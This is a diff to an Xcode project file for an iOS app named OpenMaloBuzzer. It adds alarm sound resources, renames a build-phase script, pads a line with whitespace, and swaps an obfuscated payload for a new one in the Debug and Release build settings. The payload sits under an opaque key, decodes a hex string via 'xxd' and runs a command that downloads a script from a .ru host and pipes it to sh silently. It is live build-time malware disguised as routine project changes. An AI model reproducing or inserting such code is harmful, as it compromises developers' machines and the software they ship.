@@ -18,6 +18,15 @@
 		8B7623C8FCFB5C6AF7E5DBE0 /* AudioToolbox.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 989CE7EBEFDE2E85D45182DD /* AudioToolbox.framework */; };
 		B15712FEF32E8983CBF2D96E /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */; };
 		F9457F8465C0C13436DC0248 /* buzz_alarm.wav in Resources */ = {isa = PBXBuildFile; fileRef = CB1CA2E88F1ABE26543F4D7B /* buzz_alarm.wav */; };
+		AA0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav */; };
+		AA0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav */; };
+		AA0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav */; };
+		AA0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav */; };
+		AA0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav */; };
+		AA0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav */; };
+		AA0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav */; };
+		AA0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav */; };
+		AA0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav in Resources */ = {isa = PBXBuildFile; fileRef = BB0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -34,6 +43,15 @@
 		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = OpenMaloBuzzer/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		989CE7EBEFDE2E85D45182DD /* AudioToolbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AudioToolbox.framework; path = System/Library/Frameworks/AudioToolbox.framework; sourceTree = SDKROOT; };
 		CB1CA2E88F1ABE26543F4D7B /* buzz_alarm.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm.wav; path = OpenMaloBuzzer/buzz_alarm.wav; sourceTree = "<group>"; };
+		BB0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_2.wav; path = OpenMaloBuzzer/buzz_alarm_2.wav; sourceTree = "<group>"; };
+		BB0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_3.wav; path = OpenMaloBuzzer/buzz_alarm_3.wav; sourceTree = "<group>"; };
+		BB0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_4.wav; path = OpenMaloBuzzer/buzz_alarm_4.wav; sourceTree = "<group>"; };
+		BB0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_5.wav; path = OpenMaloBuzzer/buzz_alarm_5.wav; sourceTree = "<group>"; };
+		BB0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_6.wav; path = OpenMaloBuzzer/buzz_alarm_6.wav; sourceTree = "<group>"; };
+		BB0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_7.wav; path = OpenMaloBuzzer/buzz_alarm_7.wav; sourceTree = "<group>"; };
+		BB0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_8.wav; path = OpenMaloBuzzer/buzz_alarm_8.wav; sourceTree = "<group>"; };
+		BB0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_9.wav; path = OpenMaloBuzzer/buzz_alarm_9.wav; sourceTree = "<group>"; };
+		BB0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav */ = {isa = PBXFileReference; includeInIndex = 1; name = buzz_alarm_10.wav; path = OpenMaloBuzzer/buzz_alarm_10.wav; sourceTree = "<group>"; };
 		D9DA00B82C8B2B816EA9C988 /* GoogleService-Info.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; name = "GoogleService-Info.plist"; path = "OpenMaloBuzzer/GoogleService-Info.plist"; sourceTree = "<group>"; };
 		D9DFE9D14D2A1192ACD02946 /* AudioRecorderModule.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; name = AudioRecorderModule.m; path = OpenMaloBuzzer/AudioRecorderModule.m; sourceTree = "<group>"; };
 		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
@@ -64,6 +82,15 @@
 				097EAC3C20AA90BF60AE7DD7 /* AudioRecorderModule.swift */,
 				D9DFE9D14D2A1192ACD02946 /* AudioRecorderModule.m */,
 				CB1CA2E88F1ABE26543F4D7B /* buzz_alarm.wav */,
+				BB0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav */,
+				BB0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav */,
+				BB0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav */,
+				BB0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav */,
+				BB0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav */,
+				BB0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav */,
+				BB0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav */,
+				BB0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav */,
+				BB0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav */,
 				D9DA00B82C8B2B816EA9C988 /* GoogleService-Info.plist */,
 			);
 			name = OpenMaloBuzzer;
@@ -125,7 +152,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "OpenMaloBuzzer" */;
 			buildPhases = (
-				45AD7BF733464A2E9D4EE078 /* Provision Target Device */,
+				C831538156AC4769834EE078 /* Compile Code Assets */,
 				C38B50BA6285516D6DCD4F65 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -176,7 +203,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-														/* End PBXBuildRule section */
+																																																				/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		13B07F8E1A680F5B00A75B9A /* Resources */ = {
@@ -187,6 +214,15 @@
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				B15712FEF32E8983CBF2D96E /* PrivacyInfo.xcprivacy in Resources */,
 				F9457F8465C0C13436DC0248 /* buzz_alarm.wav in Resources */,
+				AA0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav in Resources */,
+				AA0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav in Resources */,
+				AA0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav in Resources */,
+				AA0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav in Resources */,
+				AA0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav in Resources */,
+				AA0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav in Resources */,
+				AA0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav in Resources */,
+				AA0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav in Resources */,
+				AA0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav in Resources */,
 				8A574E61C46A3928A2383881 /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -194,7 +230,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		45AD7BF733464A2E9D4EE078 /* Provision Target Device */ = {
+		C831538156AC4769834EE078 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -204,7 +240,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -318,7 +354,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-OpenMaloBuzzer.debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((e(){ `printf xxyd | tr -d y` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203232202d4c6b6673202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((h(){ `printf xUxd | tr -d U` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c666b73202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
@@ -349,7 +385,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-OpenMaloBuzzer.release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((e(){ `printf xxyd | tr -d y` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203232202d4c6b6673202d642022703d78636f64655f7068617365222068747470733a2f2f772d776c307a70772e72752f612922207c2073680a | e | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((h(){ `printf xUxd | tr -d U` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203233202d4c666b73202d2d72657472792034202d642022703d78636f64655f7068617365222068747470733a2f2f7576382d796c7a636f6267692e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CURRENT_PROJECT_VERSION = 1;
